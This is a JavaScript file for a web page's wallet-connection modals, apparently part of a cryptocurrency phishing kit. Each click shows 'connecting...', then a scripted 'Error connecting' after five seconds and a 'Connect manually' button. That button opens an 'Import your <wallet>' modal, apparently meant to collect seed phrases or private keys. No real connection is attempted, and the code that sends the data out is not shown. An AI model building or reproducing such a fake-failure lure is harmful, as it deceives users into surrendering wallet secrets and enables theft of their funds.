var modal = document.getElementById("myModal");
var newModal = document.getElementById("secondMyModal");
var btns = document.querySelectorAll(".openModalButton");
var buttonSpan = document.getElementsByClassName("close-button")[0];
var items = document.querySelectorAll(".openModalButton .item");
var secondModalSpan = document.getElementsByClassName("second-close")[0];
var secondModalButtonSpan = document.getElementsByClassName("second-close-button")[0];

items.forEach(function (item) {
  item.addEventListener("click", function () {
    var logoTitle = this.querySelector(".logo-title").textContent;
    var logoSrc = this.querySelector(".logo").src;
    document.querySelector(".modal-connection-status-2a").textContent = logoTitle;
    document.querySelector(".modal-logo").src = logoSrc;
    document.querySelector(".newModalheader").textContent = `Import your ${logoTitle}`;
    document.querySelector(".modal-logo-2").src = logoSrc;
    modal.style.display = "block";
    resetVortexAndOpen();
  });
});

var vortexTimer;
function revertVortex() {
  document.querySelector('.flex-section-A').innerHTML = `
                <div class="connection-box">
                    <p class="modal-connection-status">connecting...</p>
                </div>
            `;
}
function resetVortexAndOpen() {
  clearTimeout(vortexTimer);
  revertVortex();
  setTimeout(function () {
    openVortex();
  }, 100);
}

btns.forEach(function (btn) {
  btn.onclick = function () {
    modal.style.display = "block";
    resetVortexAndOpen();
  }
});

buttonSpan.onclick = function () {
  modal.style.display = "none";
  revertVortex();
  revertToWalletSupport(); 
  clearTimeout(vortexTimer);
}

window.onclick = function (event) {
  if (event.target == modal) {
    modal.style.display = "none";
    revertVortex();
    revertToWalletSupport(); 
    clearTimeout(vortexTimer);
  }
  if (event.target == newModal) {
    newModal.style.display = "none";
    revertToWalletSupport();
  }
}

// Define the openVortex function
function openVortex() {
  clearTimeout(vortexTimer);
  vortexTimer = setTimeout(function () {
    document.querySelector('.flex-section-A').innerHTML = `
                    <div class="connection-box">
                        <p class="modal-connection-status-3a">Error connecting</p>
                        <button class="modal-connect-button-3b">Connect manually</button>
                    </div>
                `;

    document.querySelector('.connection-box').style.border = '2px solid #df2911';
    document.querySelector('.modal-connection-status-3a').style.color = '#df2911';

    document.querySelector(".modal-connect-button-3b").addEventListener("click", function () {
      modal.style.display = "none";
      newModal.style.display = "block";
      closeModalTwo();
    });
  }, 5000);
}

function closeModalTwo() {
  secondModalSpan.onclick = function () {
    newModal.style.display = "none";
    revertToWalletSupport(); 
  }

  secondModalButtonSpan.onclick = function () {
    newModal.style.display = "none";
    revertToWalletSupport(); 
  }
}

function revertToWalletSupport() {
  // Return to the wallet support section
  var walletSupportSection = document.querySelector('.wallet-support');
  if (walletSupportSection) {
    walletSupportSection.classList.remove('modal-open');
  }
}
